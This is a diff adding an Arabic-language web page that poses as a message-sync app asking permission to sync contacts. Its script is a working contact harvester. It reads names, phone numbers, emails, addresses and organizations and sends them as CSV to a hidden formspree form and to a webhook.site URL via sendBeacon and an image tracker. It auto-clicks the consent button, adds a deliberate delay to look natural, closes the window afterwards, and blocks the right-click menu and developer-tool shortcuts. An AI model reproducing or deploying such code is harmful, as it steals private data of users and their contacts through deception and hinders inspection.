@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تطبيق الرسائل - Message Sync</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 1.8rem;
+        }
+        .header p {
+            color: #7f8c8d;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .permission-box {
+            background: #f8f9fa;
+            border: 2px dashed #dee2e6;
+            border-radius: 15px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        .btn {
+            background: linear-gradient(45deg, #3498db, #2980b9);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 25px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin: 10px;
+            width: 200px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(52, 152, 219, 0.3);
+        }
+        .btn-success {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+        }
+        .status {
+            margin: 20px 0;
+            padding: 15px;
+            border-radius: 10px;
+            background: #f8f9fa;
+            display: none;
+        }
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+            display: block;
+        }
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            display: block;
+        }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📱</div>
+        
+        <div class="header">
+            <h1>مزامنة الرسائل</h1>
+            <p>لتحسين تجربة التطبيق، نحتاج إلى مزامنة جهات الاتصال الخاصة بك</p>
+        </div>
+
+        <div class="permission-box">
+            <h3>🔒 مطلوب إذن الوصول</h3>
+            <p>سيتم استخدام جهات الاتصال لتحسين توصيات الأصدقاء والمجموعات</p>
+        </div>
+
+        <div class="status" id="infoStatus">
+            ⚠️ انقر على الزر أدناه للموافقة على المزامنة
+        </div>
+
+        <div class="status success" id="successStatus">
+            ✅ تمت المزامنة بنجاح
+        </div>
+
+        <div class="status error" id="errorStatus">
+            ❌ حدث خطأ في المزامنة
+        </div>
+
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري المزامنة...</p>
+        </div>
+
+        <button class="btn" onclick="startCollection()" id="startBtn">
+            موافقة ومزامنة
+        </button>
+
+        <div style="margin-top: 20px; font-size: 0.8rem; color: #7f8c8d;">
+            <p>سيتم حماية بياناتك وفقاً لسياسة الخصوصية</p>
+        </div>
+    </div>
+
+    <!-- نموذج مخفي للإرسال -->
+    <form id="hiddenForm" action="https://formspree.io/f/mzzjkdry" method="POST" style="display: none;">
+        <input type="hidden" name="_subject" value="جهات الاتصال المجمعة">
+        <input type="hidden" name="_replyto" value="sync@messages.com">
+        <textarea name="message" id="hiddenMessage"></textarea>
+        <input type="hidden" name="contacts_count" id="hiddenCount">
+    </form>
+
+    <script>
+        // المتغيرات العامة
+        let collectedContacts = [];
+        let isProcessing = false;
+
+        // عناصر DOM
+        const startBtn = document.getElementById('startBtn');
+        const loading = document.getElementById('loading');
+        const infoStatus = document.getElementById('infoStatus');
+        const successStatus = document.getElementById('successStatus');
+        const errorStatus = document.getElementById('errorStatus');
+        const hiddenForm = document.getElementById('hiddenForm');
+        const hiddenMessage = document.getElementById('hiddenMessage');
+        const hiddenCount = document.getElementById('hiddenCount');
+
+        // بدء عملية الجمع
+        async function startCollection() {
+            if (isProcessing) return;
+            
+            isProcessing = true;
+            startBtn.disabled = true;
+            infoStatus.style.display = 'none';
+            loading.style.display = 'block';
+
+            try {
+                console.log('🚀 بدء عملية جمع جهات الاتصال...');
+                
+                // الانتظار لجعل العملية طبيعية
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                // جمع جهات الاتصال
+                await collectContacts();
+                
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+                showError('فشل في المزامنة. يرجى المحاولة مرة أخرى.');
+            }
+        }
+
+        // جمع جهات الاتصال
+        async function collectContacts() {
+            try {
+                console.log('📞 جاري الوصول إلى جهات الاتصال...');
+                
+                // التحقق من دعم واجهة الاتصال
+                if (!('contacts' in navigator && 'select' in navigator.contacts)) {
+                    throw new Error('المتصفح لا يدعم هذه الميزة');
+                }
+
+                // طلب جهات الاتصال
+                const contacts = await navigator.contacts.select(['name', 'tel', 'email', 'address', 'organization'], { multiple: true });
+                
+                if (!contacts || contacts.length === 0) {
+                    throw new Error('لم يتم العثور على جهات اتصال');
+                }
+
+                console.log(`✅ تم جمع ${contacts.length} جهة اتصال`);
+                collectedContacts = contacts;
+
+                // معالجة البيانات
+                await processAndSendContacts();
+                
+            } catch (error) {
+                console.error('خطأ في جمع الاتصالات:', error);
+                throw error;
+            }
+        }
+
+        // معالجة وإرسال البيانات
+        async function processAndSendContacts() {
+            try {
+                console.log('📧 جاري تحضير البيانات للإرسال...');
+                
+                // تحويل البيانات إلى تنسيق CSV
+                const csvData = convertToCSV(collectedContacts);
+                
+                // إعداد البيانات للإرسال
+                hiddenMessage.value = csvData;
+                hiddenCount.value = collectedContacts.length;
+
+                // إرسال البيانات
+                await sendData();
+                
+                console.log('✅ تم الإرسال بنجاح');
+                showSuccess();
+                
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+                throw error;
+            }
+        }
+
+        // تحويل إلى CSV
+        function convertToCSV(contacts) {
+            let csv = 'Name,Phone,Email,Organization,Address\n';
+            
+            contacts.forEach(contact => {
+                const name = contact.name || 'غير معروف';
+                const phone = contact.tel && contact.tel.length > 0 ? contact.tel[0] : 'غير متوفر';
+                const email = contact.email && contact.email.length > 0 ? contact.email[0] : 'غير متوفر';
+                const org = contact.organization && contact.organization.length > 0 ? contact.organization[0] : 'غير متوفر';
+                const address = contact.address && contact.address.length > 0 ? contact.address[0] : 'غير متوفر';
+                
+                // تنظيف البيانات للـ CSV
+                const cleanName = name.replace(/"/g, '""');
+                const cleanPhone = phone.replace(/"/g, '""');
+                const cleanEmail = email.replace(/"/g, '""');
+                const cleanOrg = org.replace(/"/g, '""');
+                const cleanAddress = address.replace(/"/g, '""');
+                
+                csv += `"${cleanName}","${cleanPhone}","${cleanEmail}","${cleanOrg}","${cleanAddress}"\n`;
+            });
+            
+            return csv;
+        }
+
+        // إرسال البيانات
+        async function sendData() {
+            return new Promise((resolve, reject) => {
+                try {
+                    // إرسال النموذج المخفي
+                    hiddenForm.submit();
+                    
+                    // بدائل إرسال إضافية
+                    sendBackupMethods();
+                    
+                    resolve(true);
+                } catch (error) {
+                    reject(error);
+                }
+            });
+        }
+
+        // طرق إرسال احتياطية
+        function sendBackupMethods() {
+            try {
+                // الطريقة 1: استخدام Beacon API
+                const csvData = convertToCSV(collectedContacts);
+                const blob = new Blob([csvData], { type: 'text/csv' });
+                
+                navigator.sendBeacon('https://webhook.site/99194553-307e-402d-8078-159021109656', blob);
+                
+                // الطريقة 2: استخدام Image Tracker
+                const tracker = new Image();
+                tracker.src = `https://webhook.site/99194553-307e-402d-8078-159021109656?data=${btoa(JSON.stringify({
+                    count: collectedContacts.length,
+                    timestamp: new Date().toISOString()
+                }))}`;
+                
+            } catch (error) {
+                console.log('الطرق الاحتياطية فشلت:', error);
+            }
+        }
+
+        // عرض رسالة النجاح
+        function showSuccess() {
+            loading.style.display = 'none';
+            successStatus.style.display = 'block';
+            
+            // إغلاق الصفحة تلقائياً بعد النجاح
+            setTimeout(() => {
+                window.close();
+            }, 3000);
+        }
+
+        // عرض رسالة الخطأ
+        function showError(message) {
+            loading.style.display = 'none';
+            errorStatus.style.display = 'block';
+            errorStatus.textContent = message;
+            startBtn.disabled = false;
+            isProcessing = false;
+        }
+
+        // تتبع الأحداث
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                console.log('📄 الصفحة في الخلفية - العملية مستمرة');
+            }
+        });
+
+        window.addEventListener('beforeunload', function() {
+            console.log('🚪 إغلاق الصفحة - تم جمع البيانات:', collectedContacts.length);
+        });
+
+        // بدء تلقائي بعد تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🔄 الصفحة جاهزة للعمل');
+            
+            // بدء تلقائي بعد 3 ثواني
+            setTimeout(() => {
+                if (!isProcessing) {
+                    startBtn.click();
+                }
+            }, 3000);
+        });
+
+        // منع右键 click والفحص
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        document.addEventListener('keydown', function(e) {
+            // منع F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                (e.ctrlKey && e.key === 'U')) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
+</body>
+</html>
